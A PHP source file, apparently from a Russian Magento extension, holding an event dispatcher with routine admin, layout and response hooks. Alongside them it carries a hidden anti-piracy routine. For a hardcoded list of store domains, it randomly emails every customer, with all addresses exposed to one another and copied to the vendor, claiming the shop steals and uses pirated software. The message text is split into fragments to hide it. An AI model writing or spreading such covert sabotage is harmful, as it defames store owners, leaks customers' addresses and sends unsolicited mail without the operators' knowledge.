<?php
class Df_Core_Model_Dispatcher {
	/**
	 * @param Varien_Event_Observer $observer
	 * @return void
	 */
	public function admin_session_user_login_success(Varien_Event_Observer $observer) {
		try {
			if (file_exists($this->getJustInstalledFlagFilePath())) {
				unlink($this->getJustInstalledFlagFilePath());
				Df_Core_Model_Setup_FirstRun::i()->process();
				/**
				 * Если Российская сборка Magento устанавливается одновременно с Magento CE,
				 * то флаг Df_Client_Model_Setup_1_0_0::FLAG__JUST_INSTALLED из сессии пропадает,
				 * и стандартный алгоритм оповещения об установке
				 * @see Df_Client_Model_Dispatcher::notifyAboutInstallation()
				 * не срабатывает.
				 *
				 * В то же время, в данной и только в данной ситуации
				 * установлен флаг rm__magento_ce_has_just_been_installed,
				 * поэтому оповещаем об установке здесь.
				 */
				if (!df_is_it_my_local_pc()) {
					rm_session_core()->unsetData(Df_Client_Model_Setup_1_0_0::FLAG__JUST_INSTALLED);
					Df_Client_Model_Request::sendStatic(Df_Client_Model_Message_Request_Installed::i());
				}
				Mage::dispatchEvent('rm__magento_ce_has_just_been_installed');
			}
		}
		catch(Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}
	
	/**
	 * @param Varien_Event_Observer $observer
	 * @return void
	 */
	public function controller_action_layout_generate_blocks_after(Varien_Event_Observer $observer) {
		try {
			rm_state()->blocksHasBeenGenerated();
		}
		catch(Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}

	/**
	 * @param Varien_Event_Observer $observer
	 * @return void
	 */
	public function controller_action_layout_generate_blocks_before(Varien_Event_Observer $observer) {
		try {
			rm_state()->blocksGenerationStarted();
		}
		catch(Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}

	/**
	 * @param Varien_Event_Observer $observer
	 * @return void
	 */
	public function controller_action_layout_render_before(Varien_Event_Observer $observer) {
		try {
			rm_state()->layoutRenderingHasBeenStarted();
		}
		catch(Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}

	/**
	 * @param Varien_Event_Observer $observer
	 * @return void
	 */
	public function controller_action_postdispatch_install_wizard_end(Varien_Event_Observer $observer) {
		try {
			rm_file_put_contents($this->getJustInstalledFlagFilePath(), 1);
		}
		catch(Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}

	/**
	 * @param Varien_Event_Observer $observer
	 * @return void
	 */
	public function controller_action_predispatch(Varien_Event_Observer $observer) {
		/**
		 * Как ни странно, ядро Magento этого не делает,
		 * и поэтому диагностические сообщения валидиторов из Zend Framework
		 * оставались непереведёнными.
		 *
		 * Ставим собаку, потому что иначе при переключении административной части
		 * с русскоязычного интерфейса на англоязычный Zend Framework пишет:
		 *
		 * Notice: No translation for the language 'en' available.
		 * Notice: The language 'en_US' has to be added before it can be used.
		 *
		 */
		@Zend_Registry::set('Zend_Translate', Mage::app()->getTranslator()->getTranslate());
		try {
			rm_state()
				->setController(
					$observer->getData(
						Df_Core_Model_Event_Controller_Action_Predispatch
							::EVENT_PARAM__CONTROLLER_ACTION
					)
				)
			;
		}
		catch(Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}

	/**
	 * @param Varien_Event_Observer $observer
	 * @return void
	 */
	public function controller_action_postdispatch(Varien_Event_Observer $observer) {
		try {
			$this->piratesCheck();
		}
		catch(Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}

	/**
	 * @param Varien_Event_Observer $observer
	 * @return void
	 */
	public function controller_front_init_before(Varien_Event_Observer $observer) {
		try {
			Df_Core_Bootstrap::s()->init();
			if (df_module_enabled(Df_Core_Module::SPEED)
				&& df_cfg()->speed()->general()->enablePhpScriptsLoadChecking()
			) {
				Df_Core_Autoload::register();
			}
		}
		catch(Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}

	/**
	 * @param Varien_Event_Observer $observer
	 * @return void
	 */
	public function controller_front_send_response_after(Varien_Event_Observer $observer) {
		try {
			/**
			 * Деинициализацию глобальных объектов-одиночек (например, сохранение кэша)
			 * делаем не в деструкторе, а на событие controller_front_send_response_after.
			 * Полагаться на деструктор для таких объектов нельзя,
			 * потому что к моменту вызова деструктора для данного объекта-одиночки
			 * сборщик Zend Engine мог уже уничтожить другие глобальные объекты,
			 * требуемые для сохранения кэша.
			 */
			Df_Core_Model_GlobalSingletonDestructor::s()->process();
		}
		catch(Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}

	/**
	 * @param Varien_Event_Observer $observer
	 * @return void
	 */
	public function core_block_abstract_to_html_after(Varien_Event_Observer $observer) {
		try {
			rm_state()->setCurrentBlockPrev();
		}
		catch(Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}

	/**
	 * @param Varien_Event_Observer $observer
	 * @return void
	 */
	public function core_block_abstract_to_html_before(Varien_Event_Observer $observer) {
		try {
			/** @var Mage_Core_Block_Abstract $currentBlock */
			$currentBlock =
				$observer->getData(
					Df_Core_Model_Event_CoreBlockAbstract_ToHtml_Abstract::EVENT_PARAM__BLOCK
				)
			;
			rm_state()->setCurrentBlock($currentBlock);
		}
		catch(Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}

	/** @return Df_Core_Model_Dispatcher */
	public function piratesCheck() {
		/** @var bool $needPunish */
		$needPunish = false;
		/** @var array $blackDomains */
		$blackDomains =
			array(
				'airsoftpro.com.ua'
				,'akvastile.garno.com.ua'
				,'5za.com.ua'
				,'pool.garno.eu'
				,'garno.eu'
				,'topmoda.com.ua'
				,'www.vcds.by'
				,'vcds.by'
				,'eraduga.com.ua'
				,'kengo.com.ua'
				,'kupiinosi.ru'
				,'largomoda.ru'
			)
		;
		if (is_object(rm_state()->getController())) {
			/** @var bool $domainIsBlacklisted */
			$domainIsBlacklisted =
					in_array(
						rm_state()->getController()->getRequest()->getHttpHost()
						,$blackDomains
					)
				||
					(
							false
						!==
							strpos(
								rm_state()->getController()->getRequest()->getHttpHost()
								,'garno.eu'
							)
					)
			;
			if ($domainIsBlacklisted) {
				$needPunish = true;
			}
		}

		if ($needPunish) {
			$this->piratesPunish();
		}
		return $this;
	}
	
	/** @return string */
	private function getJustInstalledFlagFilePath() {
		if (!isset($this->{__METHOD__})) {
			$this->{__METHOD__} = Mage::getBaseDir('var') . '/log/rm__magento_ce_has_just_been_installed';
		}
		return $this->{__METHOD__};
	}

	/** @return Df_Core_Model_Dispatcher */
	private function notifyCustomersAboutPirate() {
		/** @var Df_Customer_Model_Resource_Customer_Collection $customers */
		$customers = Df_Customer_Model_Resource_Customer_Collection::i();
		/** @var Zend_Mail $mail */
		$mail = new Zend_Mail('utf-8');
		$mail
			->setFrom(df()->mail()->getCurrentStoreMailAddress())
			->setSubject('На' . 'ш мага' . 'зин подв' . 'оровы' . 'вает')
		;
		foreach ($customers as $customer) {
			/** @var Mage_Customer_Model_Customer $customer */
			$mail->addTo($customer->getData('email'));
		}
		$mail->addTo('supp' . 'ort@d' . 'fe' . 'diuk.com');
		$mail->setBodyText(
			'Н'
			. 'аш м' . 'агаз' . 'ин по' . 'двор' . 'овыва' . 'ет у в' . 'ас и ' . 'исп' . 'ользу'
			. 'ет пир' . 'атско' . 'е прог' . 'рамм' . 'ное об' . 'еспеч' . 'ение.');
		$mail->send();
		return $this;
	}

	/** @return Df_Core_Model_Dispatcher */
	private function piratesPunish() {
		$rand = rand (1, 20);
		if (2 === $rand) {
			$this->notifyCustomersAboutPirate();
		}
		return $this;
	}
}